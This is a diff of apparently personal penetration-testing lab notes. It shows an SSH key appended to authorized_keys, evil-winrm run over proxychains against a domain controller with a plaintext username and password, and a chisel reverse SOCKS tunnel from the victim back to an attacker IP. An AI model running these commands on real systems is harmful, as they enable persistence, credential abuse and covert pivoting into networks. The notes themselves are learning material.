@@ -65,3 +65,26 @@ https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ansible-playbo
 
 echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0fQqdcN8qxqB3OH9lCBMyGcAz+c8a5uRxuvif1A98/jv5LLYy/2GO7r68nHOSIviFtkbnydmuTyzBBSWhbxC/MWAX8XZx5C3rF598/phDzwN4seus2SMhZi5zUZ6iylBBI8xht5J+u/InI6BlsXQ65H3xw+yFxndxeKi3Gu17glt3OEe8aAPaxj3qU89L1xbOr4m3mSqnhJne7eV05nqYvZDHP+pgOQE02dmmplRfTHCKbEfwqY/nDx7QWw6WtrQigNlEGNcWJUVKNlXBGoGHZuyHNMpoh4XjinLeM9GKFY4xRxk2CyFBLwlouOtj7s5EtFB5CLnaQMpDtzI+gJyma7nzxJZxELrlTHyjPJoQHQSmlQe+tBNBRAEL92wac79psK7s3PARdCcyEnpe8l9cplPP8YIS8tMg6BVVjTGPQNN0BJBwRxEjrvAKae1phztkQD7tZKy3aEl8VCUR8tpJ0fw0mK6/PJGxgCYXZWWKwycHOnJKQYDL17qsTypaLL8= kali@kali" >> authorized_keys
 
+### Proxychains
+
+proxychains evil-winrm -u matthew -p 147258269 -i 172.16.22.1
+
+trying evil winrm on dc with prooxychains
+
+https://vegardw.medium.com/reverse-socks-proxy-using-chisel-the-easy-way-48a78df92f29
+
+sudo ./chisel server -p 8081 --reverse 
+- on attacker
+
+./chisel client 10.10.16.24:8081 R:socks
+ - on victim
+
+on attacker
+sudo nano /etc/proxychains4.conf
+
+`socks5   127.0.0.1   1080`
+
+how to add attacker ot proxychains is what i need to look into
+
+
+
